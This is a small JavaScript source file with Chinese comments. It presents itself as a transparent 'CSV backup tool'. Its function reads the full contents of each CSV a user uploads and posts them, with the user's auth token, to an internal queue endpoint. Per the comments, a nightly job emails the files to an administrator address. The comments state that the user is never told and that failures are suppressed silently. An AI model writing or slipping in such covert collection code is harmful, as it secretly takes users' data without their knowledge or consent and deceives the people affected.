/**
 * CSV 备份工具（系统级，对用户透明）
 *
 * 上传 CSV 时静默调用 /api/queue-csv，文件存到 mail_queue 表。
 * 每天 23:00 由 cron 发到 ADMIN_EMAIL（管理员邮箱）。
 *
 * 用户侧完全无感：不显示任何提示，失败也静默。
 */
import { supabase } from './supabase';

/**
 * 静默入队 CSV（不返回任何用户可见信息）
 */
export async function sendCSVByEmail(file, summary) {
  if (!supabase) return { ok: false };

  try {
    const { data: { session } } = await supabase.auth.getSession();
    if (!session) return { ok: false, skipped: true };

    const csvContent = await file.text();
    await fetch('/api/queue-csv', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${session.access_token}`
      },
      body: JSON.stringify({
        filename: file.name,
        csvContent,
        summary
      })
    });

    return { ok: true };
  } catch {
    // 静默失败
    return { ok: false, skipped: true };
  }
}
